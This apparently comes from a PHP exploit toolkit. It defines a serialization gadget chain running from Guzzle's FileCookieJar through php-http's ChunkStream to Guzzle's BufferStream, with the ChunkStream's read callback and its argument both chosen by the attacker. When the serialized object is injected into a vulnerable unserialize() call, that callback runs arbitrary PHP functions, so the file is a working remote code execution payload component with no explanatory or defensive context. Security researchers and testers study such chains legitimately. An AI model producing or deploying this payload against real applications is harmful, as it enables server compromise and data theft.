<?php

namespace GuzzleHttp\Cookie
{
    class FileCookieJar
    {
        private $filename;

        function __construct($function,$param)
        {
            $this->filename = new \Http\Message\Encoding\ChunkStream($function,$param);
        }
    }
}

namespace Http\Message\Encoding
{
    class ChunkStream
    {
        protected $stream;
        protected $buffer='x';
        protected $readFilterCallback;

        function __construct($function,$param)
        {
            $this->stream = new \GuzzleHttp\Psr7\BufferStream($param);
            $this->readFilterCallback = $function;
        }
    }
}

namespace GuzzleHttp\Psr7
{
    class BufferStream
    {
        private $buffer;

        public function __construct($parameter)
        {
            $this->buffer = $parameter;
        }
    }
}